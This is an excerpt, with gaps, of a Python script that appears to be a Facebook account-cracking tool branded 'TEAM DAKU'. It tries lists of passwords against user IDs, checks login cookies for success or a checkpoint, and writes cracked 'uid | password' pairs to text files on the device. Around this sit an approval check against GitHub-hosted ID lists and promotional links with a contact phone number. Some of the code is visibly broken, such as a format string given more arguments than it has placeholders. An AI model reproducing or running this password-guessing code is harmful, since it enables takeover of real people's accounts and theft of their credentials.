...
def checks(ok,cp):
    if not len(ok) != 0:
        pass
    if len(cp) != 0:
        print('\n\n\x1b[1;97m TOTAL OK : \x1b[1;97m %s  \x1b[1;97mPORN-OK.txt' % (
            H, P, str(len(ok))))
        print('\x1b[1;97m TOTAL CP :\x1b[1;97m   %s \x1b[1;97mPORN-CP.txt' %
              (H, P, str(len(cp))))
...
def my_tool_security():
    ...
    print(47*"-")
    print(c, 45*"-",)
    print("\t  Facebook : Doremon.7056")
    print("\t  Fb page  : TEAM DAKU")
    print("\t  Github   : DAKU-MAKER")
    print(c, 45*"-")
    print(47*"-")
    try:
    ...
    if f_token in my_server:
        ...
        print(" otherwise msg on this whatsapp 03435908309 \n")
...
def menu_apikey():
  ...
  id = "_".join(uuid)
  server = requests.get('https://github.com/bhanja-dadri/open-scoure-/blob/main/aprovel.txt').text
...
╚══════════════════════════════════════════════════╝  """)                                           
  ...
  print("")
  print("  Subscribe Admin YOUTUBE CHENNEL,,,,,,,,,,,,,,,,,    ");time.sleep(1)
  os.system('xdg-open https://youtube.com/@jhallatrickzone5523')
  print("");time.sleep(2)
  print("\x1b[1;97m  CHECKING YOUR APROVAL.............                                                ");time.sleep (0.5)
  try:
    httpCaht = requests.get("https://github.com/Kaptan302/Done/blob/main/Done.txt").text
    if id in httpCaht:
...
def tnx():
  uuid = str(os.geteuid()) + str(os.getlogin())
  id = "_".join(uuid)
  server = requests.get('https://github.com/Kaptan302/Done/blob/main/Done.txt').text
...
def menu_apikey():
    ...
    if hamii in ["1","01"]:
        ...
        os.system("xdg-open https://youtube.com/@jhallatrickzone5523");xyz()
    elif hamii in ["3","03"]:
        os.system("xdg-open https://wa.me/+923435908309")
        xyz()    
    elif hamii in ["0","00"]:
...
def free1(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            ...
            sys.stdout.write(f'\r\33[1;37m[PORN🔥] [%s] \33[1;97m[OK:%s{hamii2}CP:%s]'%(loop,len(ok),len(cp))), 
            sys.stdout.flush()
    ...
    headers=headers,
            ...
            if 'c_user' in log_cookies:
                ...
                uid = coki[7:22]
                print('\r\033[1;32m[PORN-OK] '+uid+' [√] '+ps+ '')
                cek_apk(session,coki)
                open('/sdcard/PORN-OK.txt', 'a').write(uid+' | '+ps+'\n')
                ok.append(uid)
            elif 'checkpoint' in log_cookies:
                if 'Enter login code to continue' in log_cookies:
                    coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                    uid=coki[24:39]
                    print('\r\033[1;34m[PORN-2F] '+uid+' [~] '+ps+' ')
                    open('/sdcard/PORN-2F.txt', 'a').write(uid+' | '+ps+'\n')
                    twf.append(uid)
                else:
                    coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                    uid=coki[24:39]
                    Red = '\033[1;31m'
                    print(f'\r\033[1;35m[PORN-CP] '+uid+' [×] '+ps+ ' ')
                    open('/sdcard/PORN-CP.txt', 'a').write(uid+' | '+ps+'\n')
                    cp.append(uid)
                    break
            else:
                continue
...
def password2():
    ...
    print(f"")
    print(f'{WHITE}==========================================================')
    print(f"        \x1b[97m[\033[95;47mEXAMPLE :👇 CHOICE YOUR COUNTRY CODE \033[0;m]")
    print(f"")
